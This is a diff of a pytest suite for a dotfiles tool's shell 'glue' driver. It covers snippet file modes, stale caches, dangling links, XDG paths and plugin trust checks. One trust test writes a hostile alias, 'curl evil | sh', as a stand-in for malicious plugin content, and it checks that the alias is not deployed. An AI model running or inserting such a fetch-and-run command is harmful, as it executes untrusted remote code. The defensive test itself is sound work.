@@ -459,7 +459,7 @@ def test_user_glue_scaffolds_home_and_links(tmp_path):
     home_src = p.user_glue_dir / 'shell' / 'bash' / 'user.d' / '99-user.sh'
     link = p.home / '.config' / 'bash' / 'conf.d' / '99-user.sh'
     assert home_src.is_file() and home_src.read_text() == _USER_GLUE_HEADER
-    assert os.access(home_src, os.X_OK)                            # loaders source only a+x files
+    assert not os.access(home_src, os.X_OK)                        # your file: no chmod (no loader needs +x)
     assert link.is_symlink() and os.path.realpath(link) == os.path.realpath(home_src)
     # a user's OWN snippet dropped in the layer links on the next hookup, pointing at the layer file
     mine = p.user_glue_dir / 'shell' / 'bash' / 'user.d' / 'myalias.sh'
@@ -498,14 +498,14 @@ def test_user_glue_inlines_into_gestalt_block(tmp_path):
 
 
 def test_new_user_snippet_creates_and_deploys(tmp_path):
-    # `glue add`'s driver half: create a user.d snippet (trailing ext stripped, a+x), deploy links it
+    # `glue add`'s driver half: create a user.d snippet (trailing ext stripped), deploy links it
     # into conf.d; a second call on the same name is a no-op that preserves content; bad shell -> None.
     p = paths_for(tmp_path, shells='bash')
     p.home.mkdir(parents=True)
     g = Glue(Runner(pretend=False), p)
     path, created = g.new_user_snippet('mytools.sh', 'bash')          # trailing .sh stripped
     assert created and path == p.user_glue_dir / 'shell' / 'bash' / 'user.d' / 'mytools.sh'
-    assert os.access(path, os.X_OK)
+    assert not os.access(path, os.X_OK)                               # umask mode, never chmod 755
     g.deploy_user_glue('bash')
     link = p.home / '.config' / 'bash' / 'conf.d' / '90-mytools.sh'
     assert link.is_symlink() and os.path.realpath(link) == os.path.realpath(path)
@@ -530,7 +530,7 @@ def test_override_forks_shipped_glue_and_reports_drift(tmp_path):
     forked = g.override(rc)
     assert forked == [(p.user_glue_dir / 'shell' / 'bash' / 'btop.sh', 'bash')]
     override = forked[0][0]
-    assert override.read_text() == 'alias b=btop\n' and os.access(override, os.X_OK)
+    assert override.read_text() == 'alias b=btop\n' and not os.access(override, os.X_OK)
     assert g.override_drift(rc) == []                                # source unchanged -> no drift
     # an edit to the override is never clobbered by a re-override
     override.write_text('alias b="btop --tree"\n')
@@ -625,3 +625,306 @@ def test_a_stale_inline_block_reads_loader_off(tmp_path, monkeypatch):
     assert g._loader_ok('nu')
     (confd / '50-x.nu').write_text('let x = 2\n')                  # the input changed
     assert not g._loader_ok('nu')
+
+
+# -- review-2026-11-2 dotfiles-glue-19/24/28/29/31/32/39 ------------------------------------------
+
+def test_a_private_user_snippet_keeps_its_mode_and_still_loads(tmp_path):
+    # dotfiles-glue-19: every hookup chmod'ed user.d snippets to 0755 (a 0600 secrets file went
+    # world-readable); the bash block gates on -r, so nothing needs the x bit
+    import shutil
+    import subprocess
+    p = paths_for(tmp_path, shells='bash')
+    p.home.mkdir(parents=True)
+    ud = p.user_glue_dir / 'shell' / 'bash' / 'user.d'
+    ud.mkdir(parents=True)
+    secret = ud / 'secrets.sh'
+    secret.write_text('export CS_TOKEN=s3cret\n')
+    secret.chmod(0o600)
+    g = Glue(Runner(pretend=False), p)
+    g.deploy_user_glue('bash')
+    assert secret.stat().st_mode & 0o777 == 0o600
+    assert (p.home / '.config' / 'bash' / 'conf.d' / '90-secrets.sh').is_symlink()
+    if shutil.which('bash'):
+        out = subprocess.run(['bash', '-c', '. ~/.bashrc; echo "$CS_TOKEN"'], capture_output=True,
+                             text=True, env={'HOME': str(p.home), 'PATH': '/usr/bin:/bin'}).stdout
+        assert out.strip() == 's3cret'
+
+
+def test_installed_shells_is_memoized_across_a_status_pass(tmp_path, monkeypatch):
+    # dotfiles-glue-24: 5 `which` walks + the location cache + globs per glue name, every call
+    from configsys.drivers import glue as glue_mod
+    bindir = tmp_path / 'bin'
+    bindir.mkdir()
+    (bindir / 'bash').write_text('#!/bin/sh\n')
+    (bindir / 'bash').chmod(0o755)
+    p = Paths(env={'CONFIGSYS_HOME': str(tmp_path / 'home'), 'CONFIGSYS_REPO': str(tmp_path / 'repo'),
+                   'PATH': str(bindir)})
+    ship = p.glue_dir / 'shell' / 'bash'
+    ship.mkdir(parents=True)
+    for i in range(20):
+        (ship / f'g{i}.sh').write_text(f'# g{i}\n')
+    calls = []
+    real_which = glue_mod.shutil.which
+    monkeypatch.setattr(glue_mod.shutil, 'which', lambda *a, **k: calls.append(a[0]) or real_which(*a, **k))
+    glue_mod._SHELLS_MEMO.clear()
+    g = Glue(Runner(pretend=True), p)
+    for i in range(20):
+        g.spec_states(_glue_unit(comp=f'g{i}-glue', glue=f'g{i}'))
+        g.get_version(_glue_unit(comp=f'g{i}-glue', glue=f'g{i}'))
+    assert len(calls) <= 5 and g._installed_shells() == ['bash']
+    (bindir / 'zsh').write_text('#!/bin/sh\n')                       # a new shell lands on PATH ...
+    (bindir / 'zsh').chmod(0o755)
+    os.utime(bindir, ns=(1, 1))                                      # (its dir's mtime moves)
+    assert g._installed_shells() == ['bash', 'zsh']                  # ... and is seen, not memoized away
+
+
+def test_a_deleted_user_snippet_leaves_no_dangling_link(tmp_path):
+    # dotfiles-glue-28: removing user.d/foo.sh left conf.d/90-foo.sh dangling forever
+    p = paths_for(tmp_path, shells='bash')
+    p.home.mkdir(parents=True)
+    ud = p.user_glue_dir / 'shell' / 'bash' / 'user.d'
+    ud.mkdir(parents=True)
+    (ud / 'foo.sh').write_text('alias f=1\n')
+    g = Glue(Runner(pretend=False), p)
+    g.deploy_user_glue('bash')
+    confd = p.home / '.config' / 'bash' / 'conf.d'
+    assert (confd / '90-foo.sh').is_symlink()
+    foreign = confd / '90-other.sh'
+    foreign.symlink_to(tmp_path / 'nowhere' / 'other.sh')           # someone else's dangling link
+    (ud / 'foo.sh').unlink()
+    g.deploy_user_glue('bash')
+    assert not (confd / '90-foo.sh').is_symlink()                    # ours: pruned
+    assert foreign.is_symlink()                                      # theirs: left alone
+
+
+def test_a_stowed_bash_aliases_link_survives_shell_glue(tmp_path):
+    # dotfiles-glue-29: any link whose target was NAMED bash_aliases was taken for ours and deleted
+    p = paths_for(tmp_path, shells='bash')
+    p.home.mkdir(parents=True)
+    stow = tmp_path / 'stow' / '.bash_aliases'
+    stow.parent.mkdir()
+    stow.write_text('alias mine=1\n')
+    (p.home / '.bash_aliases').symlink_to(stow)
+    g = Glue(Runner(pretend=False), p)
+    assert g.install(_loader_unit('all')).ok
+    assert (p.home / '.bash_aliases').is_symlink()
+    assert os.path.realpath(p.home / '.bash_aliases') == os.path.realpath(stow)
+    g.uninstall(_loader_unit('all'))
+    assert (p.home / '.bash_aliases').is_symlink()
+
+
+def _nu_glue(tmp_path, monkeypatch, files):
+    import shutil as _sh
+    p = paths_for(tmp_path, shells='nu')
+    ship = p.glue_dir / 'shell' / 'nu'
+    ship.mkdir(parents=True)
+    for name, text in files.items():
+        (ship / f'{name}.nu').write_text(text)
+    p.home.mkdir(parents=True)
+    real_which = _sh.which
+    monkeypatch.setattr(_sh, 'which', lambda n, *a, **k: None if n == 'nu' else real_which(n, *a, **k))
+    return p, Glue(Runner(pretend=False), paths=p)
+
+
+@pytest.mark.real_runner
+def test_cs_eval_runs_only_from_our_roots_and_only_in_the_header(tmp_path, monkeypatch):
+    # dotfiles-glue-31: a directive was honored in any conf.d file, on any line
+    ran = tmp_path / 'ran'
+    p, g = _nu_glue(tmp_path, monkeypatch, {
+        'late': f'let x = 1\n# a comment after code\n#!cs-eval touch {ran}-late\n',
+        'early': "# init\n#!cs-eval echo 'def e [] { 1 }'\n"})
+    assert g.install(_glue_unit(comp='late-glue', glue='late')).ok
+    assert g.install(_glue_unit(comp='early-glue', glue='early')).ok
+    confd = g._confd('nu')
+    (confd / '50-foreign.nu').write_text(f'#!cs-eval touch {ran}-foreign\n')   # not configsys's file
+    block = g._inline_block('nu')
+    assert 'def e [] { 1 }' in block                                  # a header directive in our file runs
+    assert not (tmp_path / 'ran-late').exists() and 'let x = 1' in block      # line 3, after code: text
+    assert not (tmp_path / 'ran-foreign').exists() and '50-foreign.nu' in block   # foreign: inlined, not run
+
+
+@pytest.mark.real_runner
+def test_a_hung_generator_is_cut_off(tmp_path, monkeypatch):
+    import time
+    from configsys.drivers import glue as glue_mod
+    monkeypatch.setattr(glue_mod, '_EVAL_TIMEOUT', 1)
+    p, g = _nu_glue(tmp_path, monkeypatch, {'slow': '#!cs-eval sleep 30\n'})
+    t0 = time.monotonic()
+    assert g.install(_glue_unit(comp='slow-glue', glue='slow')).ok
+    assert time.monotonic() - t0 < 10
+    assert '(generated: sleep' not in g._expand(glue_mod._SHELL_RC['nu']).read_text()
+
+
+def test_glue_targets_follow_xdg_config_home(tmp_path):
+    # dotfiles-glue-32: fish/nushell/elvish read $XDG_CONFIG_HOME; glue wrote ~/.config regardless
+    from configsys import shellguard
+    xdg = tmp_path / 'xdg'
+    p = Paths(env={'CONFIGSYS_HOME': str(tmp_path / 'home'), 'CONFIGSYS_REPO': str(tmp_path / 'repo'),
+                   'CONFIGSYS_GLUE_SHELLS': 'fish,nu', 'XDG_CONFIG_HOME': str(xdg)})
+    for sh, ext in (('fish', 'fish'), ('nu', 'nu')):
+        (p.glue_dir / 'shell' / sh).mkdir(parents=True)
+        (p.glue_dir / 'shell' / sh / f'x.{ext}').write_text('# x\n')
+    p.home.mkdir(parents=True)
+    g = Glue(Runner(pretend=False), p)
+    assert g.install(_glue_unit(comp='x-glue', glue='x')).ok
+    link = xdg / 'fish' / 'conf.d' / '50-x.fish'
+    assert link.is_symlink()
+    assert os.path.realpath(link) == os.path.realpath(p.user_glue_dir / 'fish' / 'conf.d' / '50-x.fish')
+    assert '# >>> configsys glue >>>' in (xdg / 'nushell' / 'config.nu').read_text()
+    assert not (p.home / '.config' / 'fish').exists()
+    assert g.get_version(_glue_unit(comp='x-glue', glue='x')) == 'linked'
+    snap = shellguard.snapshot(p.home, p.env)                         # the guard watches the same rc
+    assert str(xdg / 'fish' / 'config.fish') in snap and str(xdg / 'fish' / 'conf.d') in snap.dirs
+
+
+def _primary(tmp_path, *, trust='content'):
+    p = paths_for(tmp_path, shells='bash')
+    pdir = p.plugins_dir / 'mine'
+    (pdir / 'glue' / 'shell' / 'bash' / 'user.d').mkdir(parents=True)
+    (pdir / 'plugin.hu').write_text('{ name: mine  requires-abi: 1 }\n')
+    p.user_config_file.write_text(f'{{ plugins: [ {{ source: "{pdir}"  primary: true }} ]\n'
+                                  f'  primary-trust: {trust} }}\n')
+    p.primary_glue_dir = pdir / 'glue'
+    p.home.mkdir(parents=True, exist_ok=True)
+    return p, pdir
+
+
+def test_an_untrusted_primarys_user_glue_is_not_linked(tmp_path):
+    # dotfiles-glue-39: under primary-trust: content a changed primary's user.d still went live
+    from configsys import plugins
+    p, pdir = _primary(tmp_path)
+    snippet = pdir / 'glue' / 'shell' / 'bash' / 'user.d' / 'mine.sh'
+    snippet.write_text('alias m=1\n')
+    g = Glue(Runner(pretend=False), p)
+    link = p.home / '.config' / 'bash' / 'conf.d' / '90-mine.sh'
+    g.deploy_user_glue('bash')
+    assert not link.is_symlink() and any('plugin trust mine' in w for w in g.hookup_warnings)
+    plugins.set_trust(p.plugin_trust_file, 'mine', plugins.plugin_identity(pdir))
+    g.deploy_user_glue('bash')
+    assert link.is_symlink() and not g.hookup_warnings               # trusted at this content: linked
+    snippet.write_text('alias m="curl evil | sh"\n')                 # the primary moves on
+    g.deploy_user_glue('bash')
+    assert not link.is_symlink()                                     # its old link goes too
+
+
+def test_a_primary_override_of_a_repo_snippet_needs_the_primarys_trust(tmp_path):
+    p, pdir = _primary(tmp_path)
+    (p.glue_dir / 'shell' / 'bash').mkdir(parents=True)
+    (p.glue_dir / 'shell' / 'bash' / 'btop.sh').write_text('alias b=btop\n')
+    (pdir / 'glue' / 'shell' / 'bash' / 'btop.sh').write_text('alias b="btop --evil"\n')
+    rc = ResolvedComponent(key='glue\\btop-glue', driver='glue', comp='btop-glue',
+                           fields={'glue': 'btop'}, source=str(p.glue_dir.parent / 'routes.hu'))
+    res = Glue(Runner(pretend=False), p).install(rc)
+    assert not res.ok and res.category == 'untrusted-plugin' and 'plugin trust mine' in res.output
+    assert not (p.home / '.config' / 'bash' / 'conf.d' / '50-btop.sh').exists()
+    p2, _ = _primary(tmp_path / 'b', trust='identity')               # the default: your primary is you
+    (p2.glue_dir / 'shell' / 'bash').mkdir(parents=True)
+    (p2.glue_dir / 'shell' / 'bash' / 'btop.sh').write_text('alias b=btop\n')
+    (p2.primary_glue_dir / 'shell' / 'bash' / 'btop.sh').write_text('alias b="btop --tree"\n')
+    rc2 = ResolvedComponent(key='glue\\btop-glue', driver='glue', comp='btop-glue',
+                            fields={'glue': 'btop'}, source=str(p2.glue_dir.parent / 'routes.hu'))
+    assert Glue(Runner(pretend=False), p2).install(rc2).ok
+
+
+def test_fish_prelude_refreshes_a_stale_location_cache(tmp_path):
+    # dotfiles-glue-26: `test -n (find … | string collect)` with no output is `test -n` = true, so
+    # fish read a >1h cache forever
+    import shutil
+    import subprocess
+    import time
+    from pathlib import Path
+    if not shutil.which('fish'):
+        pytest.skip('no fish')
+    prelude = Path(__file__).resolve().parent.parent / 'glue' / 'shell' / 'fish' / '00-configsys.fish'
+    cache = tmp_path / 'glue-locations.tsv'
+    bindir = tmp_path / 'bin'
+    bindir.mkdir()
+    (bindir / 'configsys').write_text('#!/bin/sh\nprintf "bun\\t/NEW/path\\n"\n')
+    (bindir / 'configsys').chmod(0o755)
+    env = {'HOME': str(tmp_path), 'PATH': f'{bindir}:/usr/bin:/bin', 'CONFIGSYS_STATE_DIR': str(tmp_path)}
+
+    def loc():
+        return subprocess.run(['fish', '--no-config', '-c', f'source {prelude}; cs_loc bun'],
+                              capture_output=True, text=True, env=env).stdout.strip()
+    cache.write_text('bun\t/old/path\n')
+    assert loc() == '/old/path'                                      # fresh: read, no spawn
+    old = time.time() - 3 * 3600
+    os.utime(cache, (old, old))
+    assert loc() == '/NEW/path'                                      # stale: refreshed
+
+
+# fish sources conf.d for `fish -c` too (vim :!, tmux run-shell, `$SHELL -c`): what only an
+# interactive shell uses sits behind `status is-interactive`. These init-evals set PATH/env that
+# scripts need, so they run for every fish.
+_FISH_ENV_INIT = {'pyenv.fish', 'opam.fish'}
+
+
+def test_fish_interactive_only_glue_is_guarded():
+    # dotfiles-glue-34: every snippet's completion / key-binding / init-eval / convenience alias is
+    # behind `status is-interactive`; an alias that IS the tool's entry point (alias x "$loc/x" — a
+    # managed binary off PATH) stays for scripts, like a PATH entry
+    import re
+    from pathlib import Path
+    root = Path(__file__).resolve().parent.parent / 'glue' / 'shell' / 'fish'
+    opens = re.compile(r'^(if|for|while|function|begin|switch)\b')
+    bad = []
+    for f in sorted(root.glob('*.fish')):
+        if f.name.startswith('00-'):
+            continue
+        guarded_at, depth = None, 0
+        for n, raw in enumerate(f.read_text().splitlines(), 1):
+            line = raw.split(' #')[0].strip() if not raw.lstrip().startswith('#') else ''
+            if not line:
+                continue
+            if line == 'end':
+                depth -= 1
+                if guarded_at is not None and depth < guarded_at:
+                    guarded_at = None
+                continue
+            if opens.match(line):
+                if guarded_at is None and line.startswith('if status is-interactive'):
+                    guarded_at = depth + 1
+                depth += 1
+            ok = guarded_at is not None or 'status is-interactive' in line
+            interactive = ('| source' in line and f.name not in _FISH_ENV_INIT) \
+                or re.match(r'(complete|bind)\s', line) or 'completion.fish' in line
+            m = re.match(r'alias\s+\S+\s+(.*)', line)
+            if m and not m.group(1).startswith('"$'):         # a convenience, not an entry point
+                interactive = True
+            if interactive and not ok:
+                bad.append(f'{f.name}:{n}: {line}')
+    assert not bad, 'interactive-only fish glue without a `status is-interactive` guard:\n' + '\n'.join(bad)
+
+
+def test_snippet_parity_nits(tmp_path):
+    # dotfiles-glue-40: go appended GOBIN per re-source; nu's vulkan splice; nu's v/vi shadowed vi;
+    # nu cached bash-env deltas in the state dir; the nu/elvish fallback "succeeded"
+    import shutil
+    import subprocess
+    from pathlib import Path
+    root = Path(__file__).resolve().parent.parent / 'glue' / 'shell'
+    env = {'HOME': str(tmp_path), 'PATH': '/usr/bin:/bin', 'CONFIGSYS_STATE_DIR': str(tmp_path)}
+    for sh, f in (('bash', 'bash/go.sh'), ('zsh', 'zsh/go.zsh')):
+        if shutil.which(sh):
+            out = subprocess.run([sh, '-c', f'cs_loc() {{ :; }}; . {root / f}; . {root / f}; echo "$PATH"'],
+                                 capture_output=True, text=True, env=env).stdout.strip()
+            assert out.split(':').count(f'{tmp_path}/go/bin') == 1, (sh, out)
+    nu = {f: (root / 'nu' / f).read_text() for f in ('vulkan-sdk.nu', 'neovim.nu', '00-configsys.nu')}
+    assert "+ $vk +" not in nu['vulkan-sdk.nu'].replace("'", '')        # no raw splice of the path
+    assert '^nvim' not in nu['neovim.nu']                               # unmanaged: vi stays your vi
+    assert 'glue-eval nu-bash-env' in nu['00-configsys.nu'] and 'cs-state-dir | path join nu-bash-env' \
+        not in nu['00-configsys.nu']
+    if shutil.which('nu'):
+        r = subprocess.run([shutil.which('nu'), '--no-config-file', '-c',
+                            f'source {root / "nu" / "00-configsys.nu"}; '
+                            'try { configsys version; print "ok" } catch { print "failed" }'],
+                           capture_output=True, text=True, env=env, timeout=60)
+        assert r.stdout.strip().splitlines()[-1] == 'failed', r.stdout + r.stderr
+    if shutil.which('elvish'):
+        script = tmp_path / 't.elv'
+        script.write_text((root / 'elvish' / '00-configsys.elv').read_text()
+                          + '\ntry { configsys version; echo ok } catch { echo failed }\n')
+        r = subprocess.run([shutil.which('elvish'), '-norc', str(script)], capture_output=True, text=True, env=env,
+                           timeout=60)
+        assert r.stdout.strip().splitlines()[-1] == 'failed', r.stdout + r.stderr
